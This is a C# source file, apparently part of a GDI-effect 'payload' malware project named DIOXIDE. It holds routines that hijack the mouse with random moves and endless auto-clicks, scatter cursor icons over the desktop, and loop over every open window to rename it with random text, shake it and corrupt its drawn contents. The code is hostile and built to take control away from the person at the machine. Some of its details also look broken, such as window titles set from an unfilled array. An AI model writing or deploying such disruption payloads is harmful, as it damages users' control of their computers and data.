using System;
using System.Collections.Generic;
using System.Text;
using System.Threading;
using static DIOXIDE.main;
using static DIOXIDE.payloads;
using static DIOXIDE.Functions;
using static DIOXIDE.Win32API;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace DIOXIDE
{
    public unsafe class extra
    {
        public static void cursor_movement()
        {
            while (true)
            {
                Thread.Sleep( 10 );
                Cursor.Position = new System.Drawing.Point( r.Next( 0, x ), r.Next( 0, y ) );

                if (cursor_movement_cancel == 1)
                {
                    return;
                }
            }
        }
        public static void Clicker()
        {
            while (true)
            {
                Thread.Sleep( 10 );
                mouse_event( MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0 );
                mouse_event( MOUSEEVENTF_LEFTUP, 0, 0, 0, 0 );

                if (Clicker_cancel == 1)
                {
                    return;
                }
            }
        }

        public static void CursorDraw()
        {

            CURSORINFO curInf = new CURSORINFO();

            curInf.cbSize = Marshal.SizeOf( curInf );

            for ( ; ; )
            {
                GetCursorInfo( ref curInf );

                for (int i = 0 ; i < (int)(rand() % 5 + 1) ; i++)
                {
                    DrawIcon( hdcDesktop, rand() % (rcScrBounds.right - rcScrBounds.left - GetSystemMetrics( SM_CXCURSOR )) - rcScrBounds.left,
                        rand() % (rcScrBounds.bottom - rcScrBounds.top - GetSystemMetrics( SM_CYCURSOR )) - rcScrBounds.top, curInf.hCursor );
                }
                DestroyCursor( curInf.hCursor );
                Sleep( (uint)(rand() % 11) );
                if (drawCursor_cancel == 1)
                {
                    drawCursor_cancel = 0;
                    return;
                }
            }
        }
        static bool GlobalWndProc(
    IntPtr hwnd,
    bool lParam
    )
        {
            Random rand = new Random();
            bool bParent;
            IntPtr hdc;
            RECT rcOriginal;
            RECT rc;
            int w;
            int h;

            Thread.Sleep( 10 );

            var characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var Charsarr = new char[8];
            var random = new Random();

            var szWndText = new String( Charsarr );

            for (int i = 0 ; i < Charsarr.Length ; i++)
            {
                Charsarr[i] = characters[(int)rand.Next() % characters.Length];
            }

            SetWindowTextW( hwnd, szWndText );

            GetWindowRect( hwnd, out rcOriginal );

            rc = rcOriginal;

            rc.left += (int)rand.Next() % 3 - 1;
            rc.top += (int)rand.Next() % 3 - 1;
            rc.right += (int)rand.Next() % 3 - 1;
            rc.bottom += (int)rand.Next() % 3 - 1;

            w = rc.right - rc.left;
            h = rc.bottom - rc.top;

            MoveWindow( hwnd, rc.left, rc.top, w, h, true );

            hdc = GetDC( hwnd );

            if (rand.Next() % 2 != 0)
            {
                BitBlt( hdc, rc.left, rc.top, w, h, hdc, rcOriginal.left, rcOriginal.top, (rand.Next() % 2 != 0) ? TernaryRasterOperations.SRCAND : TernaryRasterOperations.SRCPAINT );
            }
            else
            {
                w = rcOriginal.right - rcOriginal.left;
                h = rcOriginal.bottom - rcOriginal.top;
                StretchBlt( hdc, rcOriginal.left, rcOriginal.top, w, h, hdcDesktop, main.rcScrBounds.left, main.rcScrBounds.top,
                    main.rcScrBounds.right - main.rcScrBounds.left, main.rcScrBounds.bottom - main.rcScrBounds.top,
                    (rand.Next() % 2 != 0) ? TernaryRasterOperations.SRCAND : TernaryRasterOperations.SRCPAINT );
            }

            ReleaseDC( hwnd, hdc );

            bParent = lParam;

            if (bParent)
            {
                EnumChildWindows( hwnd, GlobalWndProc, IntPtr.Zero );
            }

            return true;
        }

        public static void EnumGlobalWnd()
        {
            for ( ; ; )
            {
                EnumWindows( GlobalWndProc, (IntPtr)1 );
            }
        }
    }
}
